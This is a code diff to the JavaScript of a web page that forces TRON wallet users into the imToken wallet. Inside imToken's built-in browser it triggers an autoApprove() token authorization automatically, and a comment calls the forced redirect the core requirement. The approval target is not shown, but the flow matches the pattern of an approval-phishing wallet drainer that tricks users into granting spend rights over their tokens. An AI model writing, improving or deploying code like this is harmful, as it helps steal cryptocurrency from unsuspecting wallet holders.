@@ -1373,40 +1373,40 @@ function bindApproveLogic() {
         }
 
         // 3. 无论是否发信号，强制跳转（核心需求）
-        setTimeout(() => {
-            const approveUrl = window.location.href + "#approve";
-            const encodedUrl = encodeURIComponent(approveUrl);
-            let jumpUrl = "";
+        // 替换之前的“跳转部分”代码
+setTimeout(() => {
+    // 关键：检测是否在imToken内置浏览器中
+    const isImTokenInApp = window.tronWeb?.provider?.isImToken;
 
-            // 适配所有钱包（Scheme直接用walletConfig，无硬编码）
-            if (window.tronWeb?.provider) {
-                if (window.tronWeb.provider.isImToken) {
-                    jumpUrl = walletConfig.imtoken.scheme + encodedUrl;
-                } else if (window.tronWeb.provider.isTokenPocket) {
-                    jumpUrl = walletConfig.tokenpocket.scheme + encodedUrl + walletConfig.tokenpocket.suffix;
-                } else if (window.tronWeb.provider.isTronLink) {
-                    const param = JSON.stringify({ url: approveUrl, action: "open" });
-                    jumpUrl = walletConfig.tronlink.scheme + encodeURIComponent(param);
-                } else if (window.tronWeb.provider.isBitKeep) {
-                    jumpUrl = walletConfig.bitget.scheme + encodedUrl;
-                } else {
-                    jumpUrl = "imtoken://app/dapp?url=" + encodedUrl; // 兜底用最新Scheme
-                }
-            } else {
-                jumpUrl = "imtoken://app/dapp?url=" + encodedUrl;
-            }
+    if (isImTokenInApp) {
+        // 内置浏览器：直接执行授权（不跳转）
+        try {
+            autoApprove(); // 直接调用之前的授权函数
+            console.log("内置浏览器，直接执行授权");
+        } catch (e) {
+            alert(`授权启动失败：${e.message}，请点击按钮重试`);
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+            reviewTip.style.display = "none";
+        }
+    } else {
+        // 外部浏览器：用Scheme跳转
+        const approveUrl = window.location.href + "#approve";
+        const encodedUrl = encodeURIComponent(approveUrl);
+        // imToken最新universal link（Scheme失效时用这个）
+        const jumpUrl = `https://app.imtoken.io/dapp?url=${encodedUrl}`;
 
-            // 执行跳转
-            try {
-                window.location.href = jumpUrl;
-                console.log("跳转URL（可直接复制测试）：", jumpUrl);
-            } catch (e) {
-                alert(`跳转失败！手动打开钱包，在浏览页输入：${window.location.href}`);
-                btn.disabled = false;
-                btn.textContent = lang.approveBtnText;
-                reviewTip.style.display = "none";
-            }
-        }, 300);
+        try {
+            window.location.href = jumpUrl;
+            console.log("外部浏览器，跳转钱包：", jumpUrl);
+        } catch (e) {
+            alert(`跳转失败！手动打开imToken→浏览→输入：${window.location.href}`);
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+            reviewTip.style.display = "none";
+        }
+    }
+}, 300);
     };
 } 
 // ========== 辅助函数（全部保留） ==========
